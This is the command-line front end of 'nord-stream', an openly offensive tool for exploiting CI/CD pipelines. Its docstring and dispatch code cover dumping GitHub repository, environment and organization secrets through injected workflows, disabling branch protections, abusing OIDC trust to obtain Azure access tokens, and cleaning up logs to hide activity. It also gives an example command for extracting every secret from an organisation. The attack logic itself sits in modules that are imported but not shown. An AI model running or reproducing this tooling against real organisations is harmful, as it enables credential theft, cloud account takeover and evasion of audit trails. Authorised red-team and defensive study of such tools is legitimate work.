"""
CICD pipeline exploitation tool

Usage:
    nord-stream.py github [options] --token <ghp> --org <org> [--repo <repo> --no-repo --no-env --no-org --env <env> --disable-protections --write-filter --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --yaml <yaml> --repo <repo> [--env <env> --disable-protections --write-filter --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> ([--clean-logs] [--clean-branch-policy]) [--repo <repo> --branch-name <name>]
    nord-stream.py github [options] --token <ghp> --org <org> --build-yaml <filename> --repo <repo> [--env <env> --write-filter]
    nord-stream.py github [options] --token <ghp> --org <org> --exploit-oidc --azure-tenant-id <tenant> --azure-subscription-id <subscription> --azure-client-id <client> [--repo <repo> --env <env> --branch-name <name> --no-clean]
    nord-stream.py github [options] --token <ghp> --org <org> --list-protections [--repo <repo> --write-filter --branch-name <name> --disable-protections]
    nord-stream.py github [options] --token <ghp> --org <org> --list-secrets [--repo <repo>]
    nord-stream.py github [options] --token <ghp> [--org <org>] --list-repos [--write-filter]
    nord-stream.py github [options] --token <ghp> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

args
    --token <ghp>                           Github personal token
    --org <org>                             Org name
    -r, --repo <repo>                       Run on selected repo (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all logs created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean workflow logs (default false)
    --clean-branch-policy                   Remove branch policy, can be used with --repo. This operation is done by default but can be manually triggered.
    --build-yaml <filename>                 Create a pipeline yaml file with all secrets.
    --env <env>                             Specify env for the yaml file creation.
    --no-repo                               Don't extract repo secrets.
    --no-env                                Don't extract environnments secrets.
    --no-org                                Don't extract organization secrets.
    --exploit-oidc                          Generate an access token for a cloud provider using an existing OIDC trust between a cloud role and a GitHub workflow (supports only Azure for now).
    --azure-tenant-id <tenant>              Identifier of the Azure tenant associated with the application having federated credentials.
    --azure-subscription-id <subscription>  Identifier of the Azure subscription associated with the application having federated credentials.
    --azure-client-id <client>              Identifier of the Azure application (client) associated with the application having federated credentials.
    --list-protections                      List all protections.
    --list-repos                            List all repos.
    --list-secrets                          List all secrets.
    --disable-protections                   Disable the branch protection rules (needs admin rights)
    --write-filter                          Filter repo where current user has write or admin access.
    --force                                 Don't check environment and branch protections.
    --branch-name <name>                    Use specific branch name for deployment.
    --describe-token                        Display information on the token

Examples:
    Dump all secrets from all repositories and try to disable branch protections
    $ nord-stream.py github --token "$GHP" --org myorg --disable-protections

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.github import GitHub
from nordstream.core.github import GitHubWorkflowRunner
from nordstream.utils.log import logger, NordStreamLog


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)
    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)

    # check validity of the token
    if not GitHub.checkToken(args["--token"]):
        logger.critical("Invalid token.")

    # github setup
    gitHub = GitHub(args["--token"])
    if args["--output-dir"]:
        gitHub.outputDir = args["--output-dir"] + "/"
    if args["--org"]:
        gitHub.org = args["--org"]
    if args["--branch-name"]:
        gitHub.branchName = args["--branch-name"]

    # runner setup
    gitHubWorkflowRunner = GitHubWorkflowRunner(gitHub, args["--env"])
    if args["--no-repo"]:
        gitHubWorkflowRunner.extractRepo = not args["--no-repo"]
    if args["--no-env"]:
        gitHubWorkflowRunner.extractEnv = not args["--no-env"]
    if args["--no-org"]:
        gitHubWorkflowRunner.extractOrg = not args["--no-org"]
    if args["--yaml"]:
        gitHubWorkflowRunner.yaml = args["--yaml"]
    if args["--disable-protections"]:
        gitHubWorkflowRunner.disableProtections = args["--disable-protections"]
    if args["--write-filter"]:
        gitHubWorkflowRunner.writeAccessFilter = args["--write-filter"]
    if args["--force"]:
        gitHubWorkflowRunner.forceDeploy = args["--force"]
    if args["--exploit-oidc"]:
        gitHubWorkflowRunner.exploitOIDC = args["--exploit-oidc"]
    if args["--azure-tenant-id"]:
        gitHubWorkflowRunner.tenantId = args["--azure-tenant-id"]
    if args["--azure-subscription-id"]:
        gitHubWorkflowRunner.subscriptionId = args["--azure-subscription-id"]
    if args["--azure-client-id"]:
        gitHubWorkflowRunner.clientId = args["--azure-client-id"]
    if args["--no-clean"]:
        gitHubWorkflowRunner.cleanLogs = not args["--no-clean"]

    gitHubWorkflowRunner.getRepos(args["--repo"])
    # logic
    if args["--describe-token"]:
        gitHubWorkflowRunner.describeToken()

    elif args["--list-repos"]:
        gitHubWorkflowRunner.listGitHubRepos()

    elif args["--list-secrets"]:
        gitHubWorkflowRunner.listGitHubSecrets()

    elif args["--build-yaml"]:
        gitHubWorkflowRunner.workflowFilename = args["--build-yaml"]
        gitHubWorkflowRunner.createYaml(args["--repo"])

    # Cleaning
    elif args["--clean-logs"] or args["--clean-branch-policy"]:
        if args["--clean-logs"]:
            gitHubWorkflowRunner.manualCleanLogs()
        if args["--clean-branch-policy"]:
            gitHubWorkflowRunner.manualCleanBranchPolicy()

    elif args["--list-protections"]:
        gitHubWorkflowRunner.checkBranchProtections()

    else:
        gitHubWorkflowRunner.runWorkflow()
